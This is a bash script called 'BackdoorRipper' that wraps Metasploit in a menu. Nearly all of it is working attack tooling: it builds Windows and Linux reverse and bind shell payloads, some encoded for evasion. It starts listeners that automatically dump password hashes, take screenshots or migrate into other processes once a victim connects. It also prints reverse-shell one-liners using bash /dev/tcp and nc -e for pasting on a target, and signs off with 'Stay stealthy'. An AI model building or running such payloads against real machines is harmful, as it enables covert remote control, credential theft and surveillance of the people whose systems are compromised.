#!/usr/bin/env bash

# @Colors
RED='\033[0;31m';     GREEN='\033[0;32m';   YELLOW='\033[1;33m'
BLUE='\033[0;34m';    MAGENTA='\033[0;35m'; CYAN='\033[0;36m'
WHITE='\033[1;37m';   BOLD='\033[1m';       RESET='\033[0m'

#  @banner
banner() {
    clear
    echo -e "${RED}"
    cat << 'EOF'
 ______            _   ______                  ______ _
| ___ \          | |  |  _  \                 | ___ (_)
| |_/ / __ _  ___| | _| | | |___   ___  _ __  | |_/ /_ _ __  _ __  _ __   ___ _ __
| ___ \/ _` |/ __| |/ / | | / _ \ / _ \| '__| |    /| | '_ \| '_ \| '_ \ / _ \ '__|
| |_/ / (_| | (__|   <| |/ / (_) | (_) | |    | |\ \| | |_) | |_) | |_) |  __/ |
\____/ \__,_|\___|_|\_\___/ \___/ \___/|_|    \_| \_|_| .__/| .__/| .__/ \___|_|
                                                        | |   | |   |
                                                        |_|   |_|   |_|

https://github.com/jasuasau/
EOF
}

# @Output dir
OUTDIR="$PWD/BackdoorRipperPayloads"
mkdir -p "$OUTDIR"

# @Helpers
pause() {
    echo
    read -rp $'\n\033[1;37m[\033[0;33m*\033[1;37m] Press ENTER to return to menu...\033[0m'
}

validate_lhost() {
    if [[ -z "$LHOST" || "$LHOST" == "0.0.0.0" ]]; then
        echo -e "${RED}    [!] LHOST cannot be empty or 0.0.0.0 — bind to your actual interface${RESET}"
        read -rp "$(echo -e "${CYAN}    [>]${RESET} LHOST (attacker IP): ${YELLOW}")" LHOST
        validate_lhost
    fi
}

get_lhost() {
    read -rp "$(echo -e "${CYAN}    [>]${RESET} LHOST (attacker IP): ${YELLOW}")" LHOST
    validate_lhost
    echo -ne "${RESET}"
    read -rp "$(echo -e "${CYAN}    [>]${RESET} LPORT (port): ${YELLOW}")" LPORT
    echo -ne "${RESET}"
    read -rp "$(echo -e "${CYAN}    [>]${RESET} Output filename (no ext): ${YELLOW}")" OUT
    echo -ne "${RESET}"
}

# @Winload
win_payloads() {
    banner
    echo -e "${WHITE}${BOLD}  WINDOWS PAYLOADS${RESET}\n"
    echo -e "  ${GREEN}[1]${RESET} EXE  (x64)  - reverse_tcp      ${CYAN}meterpreter${RESET}"
    echo -e "  ${GREEN}[2]${RESET} EXE  (x64)  - reverse_tcp      ${CYAN}shell${RESET}"
    echo -e "  ${GREEN}[3]${RESET} EXE  (x64)  - reverse_https    ${CYAN}meterpreter (evasive, TLS)${RESET}"
    echo -e "  ${GREEN}[4]${RESET} EXE  (x64)  - reverse_tcp      ${CYAN}meterpreter + shikata encoder${RESET}"
    echo -e "  ${GREEN}[5]${RESET} EXE  (x64)  - bind_tcp         ${CYAN}meterpreter${RESET}"
    echo -e "  ${GREEN}[6]${RESET} DLL  (x64)  - reverse_tcp      ${CYAN}meterpreter${RESET}"
    echo -e "  ${GREEN}[7]${RESET} MSI  (x64)  - reverse_tcp      ${CYAN}meterpreter${RESET}"
    echo -e "  ${GREEN}[8]${RESET} PSH  (x64)  - reverse_tcp      ${CYAN}meterpreter (PowerShell)${RESET}"
    echo -e "  ${GREEN}[9]${RESET} EXE  (x86)  - reverse_tcp      ${CYAN}meterpreter${RESET}"
    echo -e "  ${GREEN}[0]${RESET} Back\n"
    read -rp "$(echo -e "${CYAN}    [>]${RESET} Select: ${YELLOW}")" CHOICE
    echo -ne "${RESET}"

    case $CHOICE in
        0) return ;;
        *) get_lhost ;;
    esac

    local ext="exe"
    case $CHOICE in
        1) msfvenom -p windows/x64/meterpreter/reverse_tcp    LHOST="$LHOST" LPORT="$LPORT" -f exe -o "$OUTDIR/$OUT.$ext" ;;
        2) msfvenom -p windows/x64/shell_reverse_tcp           LHOST="$LHOST" LPORT="$LPORT" -f exe -o "$OUTDIR/$OUT.$ext" ;;
        3) msfvenom -p windows/x64/meterpreter/reverse_https   LHOST="$LHOST" LPORT="$LPORT" -f exe -o "$OUTDIR/$OUT.$ext" ;;
        4) msfvenom -p windows/x64/meterpreter/reverse_tcp     LHOST="$LHOST" LPORT="$LPORT" \
               -e x86/shikata_ga_nai -i 5 -f exe -o "$OUTDIR/$OUT.$ext" ;;
        5) msfvenom -p windows/x64/meterpreter/bind_tcp        LHOST=0.0.0.0  LPORT="$LPORT" -f exe -o "$OUTDIR/$OUT.$ext" ;;
        6) msfvenom -p windows/x64/meterpreter/reverse_tcp     LHOST="$LHOST" LPORT="$LPORT" -f dll -o "$OUTDIR/$OUT.dll"; ext="dll" ;;
        7) msfvenom -p windows/x64/meterpreter/reverse_tcp     LHOST="$LHOST" LPORT="$LPORT" -f msi -o "$OUTDIR/$OUT.msi"; ext="msi" ;;
        8) msfvenom -p windows/x64/meterpreter/reverse_tcp     LHOST="$LHOST" LPORT="$LPORT" -f psh -o "$OUTDIR/$OUT.ps1"; ext="ps1" ;;
        9) msfvenom -p windows/meterpreter/reverse_tcp         LHOST="$LHOST" LPORT="$LPORT" -f exe -o "$OUTDIR/$OUT.$ext" ;;
        *) echo -e "${RED}Invalid choice${RESET}"; sleep 1; win_payloads; return ;;
    esac

    echo -e "${GREEN}    [+] Payload written to $OUTDIR/$OUT.$ext${RESET}"
    echo -e "${YELLOW}    [i] Handler: msfconsole -x 'use multi/handler; set payload windows/x64/meterpreter/reverse_tcp; set LHOST $LHOST; set LPORT $LPORT; run'${RESET}"
    pause
}

# @Linload
linux_payloads() {
    banner
    echo -e "${WHITE}${BOLD}  LINUX PAYLOADS${RESET}\n"
    echo -e "  ${GREEN}[1]${RESET} ELF (x64) - reverse_tcp  ${CYAN}meterpreter${RESET}"
    echo -e "  ${GREEN}[2]${RESET} ELF (x64) - reverse_tcp  ${CYAN}shell (stable)${RESET}"
    echo -e "  ${GREEN}[3]${RESET} ELF (x64) - bind_tcp     ${CYAN}meterpreter${RESET}"
    echo -e "  ${GREEN}[4]${RESET} ELF (x64) - reverse_tcp  ${CYAN}meterpreter + shikata encoder${RESET}"
    echo -e "  ${GREEN}[5]${RESET} Python   - reverse_tcp   ${CYAN}meterpreter (.py)${RESET}"
    echo -e "  ${GREEN}[6]${RESET} Bash     - reverse_tcp   ${CYAN}one-liner (no file written)${RESET}"
    echo -e "  ${GREEN}[7]${RESET} ELF (x86) - reverse_tcp  ${CYAN}meterpreter${RESET}"
    echo -e "  ${GREEN}[0]${RESET} Back\n"
    read -rp "$(echo -e "${CYAN}    [>]${RESET} Select: ${YELLOW}")" CHOICE
    echo -ne "${RESET}"

    case $CHOICE in
        0) return ;;
        6) read -rp "$(echo -e "${CYAN}    [>]${RESET} LHOST: ${YELLOW}")" LHOST
           validate_lhost
           echo -ne "${RESET}"
           read -rp "$(echo -e "${CYAN}    [>]${RESET} LPORT: ${YELLOW}")" LPORT
           echo -ne "${RESET}"
           echo -e "${YELLOW}    cmd/unix/reverse_bash one-liner (paste on target):${RESET}"
           echo -e "${WHITE}    bash -i >& /dev/tcp/$LHOST/$LPORT 0>&1${RESET}"
           echo -e "${YELLOW}    or generate raw with msfvenom:${RESET}"
           echo -e "${WHITE}    msfvenom -p cmd/unix/reverse_bash LHOST=$LHOST LPORT=$LPORT -f raw${RESET}"
           pause
           return ;;  # fixed Early Return
        *) get_lhost ;;
    esac

    local ext="elf"
    case $CHOICE in
        1) msfvenom -p linux/x64/meterpreter/reverse_tcp  LHOST="$LHOST" LPORT="$LPORT" -f elf -o "$OUTDIR/$OUT.$ext" ;;
        2) msfvenom -p linux/x64/shell_reverse_tcp         LHOST="$LHOST" LPORT="$LPORT" -f elf -o "$OUTDIR/$OUT.$ext" ;;
        3) msfvenom -p linux/x64/meterpreter/bind_tcp      LHOST=0.0.0.0  LPORT="$LPORT" -f elf -o "$OUTDIR/$OUT.$ext" ;;
        4) msfvenom -p linux/x64/meterpreter/reverse_tcp   LHOST="$LHOST" LPORT="$LPORT" \
               -e x86/shikata_ga_nai -i 5 -f elf -o "$OUTDIR/$OUT.$ext" ;;
        5) msfvenom -p cmd/unix/reverse_python             LHOST="$LHOST" LPORT="$LPORT" -f raw -o "$OUTDIR/$OUT.py"; ext="py" ;;
        7) msfvenom -p linux/x86/meterpreter/reverse_tcp   LHOST="$LHOST" LPORT="$LPORT" -f elf -o "$OUTDIR/$OUT.$ext" ;;
        *) echo -e "${RED}Invalid choice${RESET}"; sleep 1; linux_payloads; return ;;
    esac

    if ls "$OUTDIR/$OUT"* &>/dev/null; then
        echo -e "${GREEN}    [+] Payload written to $OUTDIR/${RESET}"
    fi
    echo -e "${YELLOW}    [i] Handler: msfconsole -x 'use multi/handler; set LHOST $LHOST; set LPORT $LPORT; run'${RESET}"
    pause
}

# @handler&commands
handler_menu() {
    banner
    echo -e "${WHITE}${BOLD}  LIVE HANDLER + COMMAND SENDING${RESET}\n"
    echo -e "  ${GREEN}[1]${RESET} Win x64 meterpreter reverse_tcp   (interactive handler)"
    echo -e "  ${GREEN}[2]${RESET} Win x64 meterpreter reverse_https (interactive handler)"
    echo -e "  ${GREEN}[3]${RESET} Linux x64 meterpreter reverse_tcp (interactive handler)"
    echo -e "  ${GREEN}[4]${RESET} Custom payload (type payload name)"
    echo -e "  ${GREEN}[5]${RESET} Handler with AUTO commands (AutoRunScript on session open)"
    echo -e "  ${GREEN}[6]${RESET} One-off command to incoming session (non-interactive)"
    echo -e "  ${GREEN}[0]${RESET} Back\n"
    read -rp "$(echo -e "${CYAN}    [>]${RESET} Select: ${YELLOW}")" CHOICE
    echo -ne "${RESET}"

    case $CHOICE in
        1) PAYLOAD="windows/x64/meterpreter/reverse_tcp";   start_handler ;;
        2) PAYLOAD="windows/x64/meterpreter/reverse_https"; start_handler ;;
        3) PAYLOAD="linux/x64/meterpreter/reverse_tcp";     start_handler ;;
        4) read -rp "$(echo -e "${CYAN}    [>]${RESET} Payload name: ${YELLOW}")" PAYLOAD
           echo -ne "${RESET}"
           start_handler ;;
        5) auto_commands ;;
        6) oneoff_command ;;
        0) return ;;
        *) echo -e "${RED}Invalid choice${RESET}"; sleep 1; handler_menu ;;
    esac
}

start_handler() {
    read -rp "$(echo -e "${CYAN}    [>]${RESET} LHOST (attacker IP): ${YELLOW}")" LHOST
    validate_lhost
    echo -ne "${RESET}"
    read -rp "$(echo -e "${CYAN}    [>]${RESET} LPORT (port): ${YELLOW}")" LPORT
    echo -ne "${RESET}"
    read -rp "$(echo -e "${CYAN}    [>]${RESET} Extra msfconsole commands, ';' separated (blank = none): ${YELLOW}")" EXTRA
    echo -ne "${RESET}"

    echo -e "${GREEN}    [+] Launching handler for $PAYLOAD on $LHOST:$LPORT...${RESET}"
    echo -e "${YELLOW}    [i] Tip: lock port $LPORT with iptables to your target IP only${RESET}"
    echo -e "${YELLOW}    [i] Once a session opens:${RESET}"
    echo -e "        meterpreter> sysinfo"
    echo -e "        meterpreter> shell"
    echo -e "        meterpreter> execute -f cmd.exe -i -H"
    echo -e "        meterpreter> upload <local> <remote>"
    echo -e "        meterpreter> download <remote>"
    echo -e "        meterpreter> run post/multi/recon/local_exploit_suggester"

    if [ -n "$EXTRA" ]; then
        msfconsole -q -x "use multi/handler; set payload $PAYLOAD; set LHOST $LHOST; set LPORT $LPORT; set ExitOnSession false; $EXTRA; run"
    else
        msfconsole -q -x "use multi/handler; set payload $PAYLOAD; set LHOST $LHOST; set LPORT $LPORT; set ExitOnSession false; run"
    fi
    pause
}

auto_commands() {
    read -rp "$(echo -e "${CYAN}    [>]${RESET} LHOST: ${YELLOW}")" LHOST
    validate_lhost
    echo -ne "${RESET}"
    read -rp "$(echo -e "${CYAN}    [>]${RESET} LPORT: ${YELLOW}")" LPORT
    echo -ne "${RESET}"
    read -rp "$(echo -e "${CYAN}    [>]${RESET} Payload: ${YELLOW}")" PAYLOAD
    echo -ne "${RESET}"

    echo -e "${YELLOW}    [i] Pick auto-run action (runs as soon as session opens):${RESET}"
    echo -e "      ${GREEN}[1]${RESET} System recon (sysinfo, getuid, ipconfig/ifconfig)"
    echo -e "      ${GREEN}[2]${RESET} Privilege escalation suggester"
    echo -e "      ${GREEN}[3]${RESET} Dump password hashes (Windows, needs admin/SYSTEM)"
    echo -e "      ${GREEN}[4]${RESET} Screenshot (Windows meterpreter)"
    echo -e "      ${GREEN}[5]${RESET} Migrate into another process"
    echo -e "      ${GREEN}[6]${RESET} Custom AutoRunScript (script or resource file)"
    read -rp "$(echo -e "${CYAN}    [>]${RESET} Select action: ${YELLOW}")" ACT
    echo -ne "${RESET}"

    case $ACT in
        1) SCRIPT="multi_console_command -e 'sysinfo; getuid; ipconfig; ifconfig'" ;;
        2) SCRIPT="post/multi/recon/local_exploit_suggester" ;;
        3) SCRIPT="post/windows/gather/hashdump" ;;
        4) SCRIPT="multiscript -e 'screenshot'" ;;
        5) read -rp "$(echo -e "${CYAN}    [>]${RESET} Target process (e.g. explorer.exe): ${YELLOW}")" PROC
           echo -ne "${RESET}"
           SCRIPT="post/windows/manage/migrate PID=0 NAME=$PROC" ;;
        6) read -rp "$(echo -e "${CYAN}    [>]${RESET} Script/module: ${YELLOW}")" SCRIPT
           echo -ne "${RESET}" ;;
        *) echo -e "${RED}Invalid action${RESET}"; sleep 1; return ;;
    esac

    echo -e "${GREEN}    [+] Handler armed with AutoRunScript: $SCRIPT${RESET}"
    msfconsole -q -x "use multi/handler; set payload $PAYLOAD; set LHOST $LHOST; set LPORT $LPORT; set ExitOnSession false; set AutoRunScript '$SCRIPT'; run"
    pause
}

oneoff_command() {
    read -rp "$(echo -e "${CYAN}    [>]${RESET} LHOST: ${YELLOW}")" LHOST
    validate_lhost
    echo -ne "${RESET}"
    read -rp "$(echo -e "${CYAN}    [>]${RESET} LPORT: ${YELLOW}")" LPORT
    echo -ne "${RESET}"
    read -rp "$(echo -e "${CYAN}    [>]${RESET} Payload: ${YELLOW}")" PAYLOAD
    echo -ne "${RESET}"
    read -rp "$(echo -e "${CYAN}    [>]${RESET} Command(s) to run on session, ';' separated: ${YELLOW}")" CMD
    echo -ne "${RESET}"

    echo -e "${GREEN}    [+] Handler will run '$CMD' then drop to console${RESET}"
    msfconsole -q -x "use multi/handler; set payload $PAYLOAD; set LHOST $LHOST; set LPORT $LPORT; set ExitOnSession false; set AutoRunScript 'multi_console_command -e \"$CMD\"'; run"
    pause
}

# @Oneliners
oneliners() {
    banner
    echo -e "${WHITE}${BOLD}  ONE-LINER LISTENER + PAYLOAD CHEATSHEET${RESET}\n"
    read -rp "$(echo -e "${CYAN}    [>]${RESET} LHOST: ${YELLOW}")" LHOST
    validate_lhost
    echo -ne "${RESET}"
    read -rp "$(echo -e "${CYAN}    [>]${RESET} LPORT: ${YELLOW}")" LPORT
    echo -ne "${RESET}"
    echo -e "\n${MAGENTA}  ── Windows PowerShell ──${RESET}"
    echo -e "${WHITE}  msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=$LHOST LPORT=$LPORT -f psh${RESET}"
    echo -e "${MAGENTA}  ── Linux bash (target-side) ──${RESET}"
    echo -e "${WHITE}  bash -i >& /dev/tcp/$LHOST/$LPORT 0>&1${RESET}"
    echo -e "${MAGENTA}  ── Netcat ──${RESET}"
    echo -e "${WHITE}  nc -e /bin/bash $LHOST $LPORT${RESET}"
    echo -e "${MAGENTA}  ── Python ──${RESET}"
    echo -e "${WHITE}  msfvenom -p cmd/unix/reverse_python LHOST=$LHOST LPORT=$LPORT -f raw${RESET}"
    pause
}

# @mainMenu
main() {
    if ! command -v msfvenom &>/dev/null; then
        echo -e "${RED}[!] msfvenom not found. Install Metasploit first.${RESET}"
        exit 1
    fi
    if ! command -v msfconsole &>/dev/null; then
        echo -e "${RED}[!] msfconsole not found. Install Metasploit first.${RESET}"
        exit 1
    fi

    while true; do
        banner
        echo -e "\n  ${WHITE}${BOLD}MAIN MENU${RESET}\n"
        echo -e "  ${GREEN}[1]${RESET} Windows payloads"
        echo -e "  ${GREEN}[2]${RESET} Linux payloads"
        echo -e "  ${GREEN}[3]${RESET} Live handler + command sending"
        echo -e "  ${GREEN}[4]${RESET} One-liner cheatsheet"
        echo -e "  ${GREEN}[5]${RESET} List output directory"
        echo -e "  ${RED}[6]${RESET} Exit\n"
        read -rp "$(echo -e "${CYAN}  [>]${RESET} Select: ${YELLOW}")" CHOICE
        echo -ne "${RESET}"
        case $CHOICE in
            1) win_payloads ;;
            2) linux_payloads ;;
            3) handler_menu ;;
            4) oneliners ;;
            5) banner; echo; ls -la "$OUTDIR" 2>/dev/null; pause ;;
            6) echo -e "${RED}    [x] BackdoorRipper out. Stay stealthy.${RESET}"; exit 0 ;;
            *) echo -e "${RED}Invalid choice${RESET}"; sleep 1 ;;
        esac
    done
}

main
